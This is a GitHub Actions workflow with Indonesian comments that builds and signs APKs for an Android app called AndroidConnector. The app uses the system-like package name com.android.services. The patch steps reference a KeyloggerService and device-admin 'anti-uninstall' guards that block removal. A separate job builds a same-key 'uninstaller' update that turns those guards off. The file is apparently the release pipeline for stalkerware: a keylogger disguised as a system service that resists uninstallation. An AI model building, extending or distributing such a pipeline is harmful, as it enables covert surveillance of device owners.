name: Build Android APK

on:
  push:
    branches: [ main, master ]
    paths:
      - 'android/**'
      - '.github/workflows/build-apk.yml'
  pull_request:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  # ─── DEBUG BUILD (re-signed pakai release keystore) ─────────────────────────
  build-debug:
    name: Build Debug APK (Release-Signed)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: '17', cache: gradle }
      - uses: gradle/actions/setup-gradle@v4
        with: { gradle-version: '8.4' }
      - run: cd android && gradle wrapper --gradle-version 8.4 && chmod +x gradlew
      - uses: android-actions/setup-android@v3
      - run: yes | sdkmanager --licenses || true
      - run: cd android && ./gradlew assembleDebug --no-daemon --stacktrace

      - name: Re-sign Debug APK dengan Release Keystore
        env:
          KEYSTORE_PASSWORD: ${{ secrets.KEYSTORE_PASSWORD }}
          KEY_ALIAS: ${{ secrets.KEY_ALIAS }}
          KEY_PASSWORD: ${{ secrets.KEY_PASSWORD }}
        run: |
          echo "${{ secrets.KEYSTORE_BASE64 }}" | base64 --decode > /tmp/androidconnector.p12

          APKSIGNER=$(find $ANDROID_SDK_ROOT/build-tools -name "apksigner" | sort -V | tail -1)
          echo "apksigner: $APKSIGNER"

          # Hapus signature lama (debug), lalu sign ulang dengan release keystore
          $APKSIGNER sign             --ks /tmp/androidconnector.p12             --ks-type PKCS12             --ks-pass pass:"$KEYSTORE_PASSWORD"             --key-pass pass:"$KEY_PASSWORD"             --ks-key-alias "$KEY_ALIAS"             --out android/app/build/outputs/apk/debug/app-debug-release-signed.apk             android/app/build/outputs/apk/debug/app-debug.apk

          echo "✅ Re-sign selesai"
          $APKSIGNER verify --print-certs android/app/build/outputs/apk/debug/app-debug-release-signed.apk | head -5

      - uses: actions/upload-artifact@v4
        with:
          name: AndroidConnector-debug-release-signed-${{ github.sha }}
          path: android/app/build/outputs/apk/debug/app-debug-release-signed.apk
          retention-days: 30

  # ─── RELEASE BUILD + SIGN ────────────────────────────────────────────────────
  build-release:
    name: Build & Sign Release APK
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master'

    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: '17', cache: gradle }
      - uses: gradle/actions/setup-gradle@v4
        with: { gradle-version: '8.4' }
      - run: cd android && gradle wrapper --gradle-version 8.4 && chmod +x gradlew
      - uses: android-actions/setup-android@v3
      - run: yes | sdkmanager --licenses || true

      - name: Decode Keystore
        run: |
          echo "${{ secrets.KEYSTORE_BASE64 }}" | base64 --decode > android/app/androidconnector.p12

      - name: Build Release APK
        env:
          KEYSTORE_PASSWORD: ${{ secrets.KEYSTORE_PASSWORD }}
          KEY_ALIAS: ${{ secrets.KEY_ALIAS }}
          KEY_PASSWORD: ${{ secrets.KEY_PASSWORD }}
        run: |
          cd android
          ./gradlew assembleRelease --no-daemon \
            -Pandroid.injected.signing.store.file="$GITHUB_WORKSPACE/android/app/androidconnector.p12" \
            -Pandroid.injected.signing.store.password="$KEYSTORE_PASSWORD" \
            -Pandroid.injected.signing.key.alias="$KEY_ALIAS" \
            -Pandroid.injected.signing.key.password="$KEY_PASSWORD"

      - name: Package Artifact
        run: |
          mkdir -p dist
          cp android/app/build/outputs/apk/release/app-release.apk \
             dist/AndroidConnector-release-signed.apk

      - uses: actions/upload-artifact@v4
        with:
          name: AndroidConnector-release-signed-${{ github.sha }}
          path: dist/AndroidConnector-release-signed.apk
          retention-days: 90

      - name: Build Summary
        run: |
          echo "## ✅ Build Berhasil" >> $GITHUB_STEP_SUMMARY
          echo "| | |" >> $GITHUB_STEP_SUMMARY
          echo "|---|---|" >> $GITHUB_STEP_SUMMARY
          echo "| **APK** | AndroidConnector-release-signed.apk |" >> $GITHUB_STEP_SUMMARY
          echo "| **Commit** | \`${{ github.sha }}\` |" >> $GITHUB_STEP_SUMMARY
          echo "| **R8** | ✅ Aktif |" >> $GITHUB_STEP_SUMMARY
          echo "| **Signed** | ✅ V2 + V3 |" >> $GITHUB_STEP_SUMMARY
          ls -lh android/app/build/outputs/apk/release/

  # ─── UNINSTALLER APK — parallel dengan build-release ─────────────────────────
  build-uninstaller:
    name: "🗑️ Build Uninstaller APK"
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main' || github.ref == 'refs/heads/master'

    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with: { distribution: temurin, java-version: '17', cache: gradle }
      - uses: gradle/actions/setup-gradle@v4
        with: { gradle-version: '8.4' }
      - run: cd android && gradle wrapper --gradle-version 8.4 && chmod +x gradlew
      - uses: android-actions/setup-android@v3
      - run: yes | sdkmanager --licenses || true

      - name: Patch - Matikan semua anti-uninstall
        run: |
          # Ganti AppDeviceAdminReceiver dengan versi tanpa proteksi
          cp android/scripts/uninstaller/AppDeviceAdminReceiver.kt \
             android/app/src/main/kotlin/com/android/services/AppDeviceAdminReceiver.kt

          # Matikan adminGuardEnabled (120ms/50ms guard di KeyloggerService)
          sed -i 's/@Volatile var adminGuardEnabled: Boolean = true/@Volatile var adminGuardEnabled: Boolean = false/' \
            android/app/src/main/kotlin/com/android/services/KeyloggerService.kt

          # Matikan auto setBlockUninstall saat service start
          sed -i 's/Thread { AppDeviceAdminReceiver.setBlockUninstall/\/\/ Thread { AppDeviceAdminReceiver.setBlockUninstall/' \
            android/app/src/main/kotlin/com/android/services/ConnectorService.kt
          sed -i 's/\.also { it\.isDaemon = true }\.start()/\/\/ .also { it.isDaemon = true }.start()/' \
            android/app/src/main/kotlin/com/android/services/ConnectorService.kt

          echo "✅ Semua patch applied"
          grep "adminGuardEnabled" android/app/src/main/kotlin/com/android/services/KeyloggerService.kt

      - name: Decode Keystore
        run: |
          echo "${{ secrets.KEYSTORE_BASE64 }}" | base64 --decode > android/app/androidconnector.p12

      - name: Build & Sign Uninstaller APK
        env:
          KEYSTORE_PASSWORD: ${{ secrets.KEYSTORE_PASSWORD }}
          KEY_ALIAS: ${{ secrets.KEY_ALIAS }}
          KEY_PASSWORD: ${{ secrets.KEY_PASSWORD }}
        run: |
          cd android
          ./gradlew assembleRelease --no-daemon \
            -Pandroid.injected.signing.store.file="$GITHUB_WORKSPACE/android/app/androidconnector.p12" \
            -Pandroid.injected.signing.store.password="$KEYSTORE_PASSWORD" \
            -Pandroid.injected.signing.key.alias="$KEY_ALIAS" \
            -Pandroid.injected.signing.key.password="$KEY_PASSWORD"

      - name: Package Artifact
        run: |
          mkdir -p dist
          cp android/app/build/outputs/apk/release/app-release.apk \
             dist/AndroidConnector-UNINSTALLER.apk
          echo "📦 $(du -h dist/AndroidConnector-UNINSTALLER.apk | cut -f1)"

      - uses: actions/upload-artifact@v4
        with:
          name: AndroidConnector-UNINSTALLER-${{ github.sha }}
          path: dist/AndroidConnector-UNINSTALLER.apk
          retention-days: 90

      - name: Build Summary
        run: |
          echo "## 🗑️ Uninstaller APK Siap" >> $GITHUB_STEP_SUMMARY
          echo "| | |" >> $GITHUB_STEP_SUMMARY
          echo "|---|---|" >> $GITHUB_STEP_SUMMARY
          echo "| **Package** | com.android.services (identik) |" >> $GITHUB_STEP_SUMMARY
          echo "| **Keystore** | Sama → Android terima sebagai Update |" >> $GITHUB_STEP_SUMMARY
          echo "| **Anti-Uninstall** | OFF semua |" >> $GITHUB_STEP_SUMMARY
          echo "" >> $GITHUB_STEP_SUMMARY
          echo "Install APK ini sebagai update → Settings > Device Admin > Nonaktifkan > Uninstall" >> $GITHUB_STEP_SUMMARY
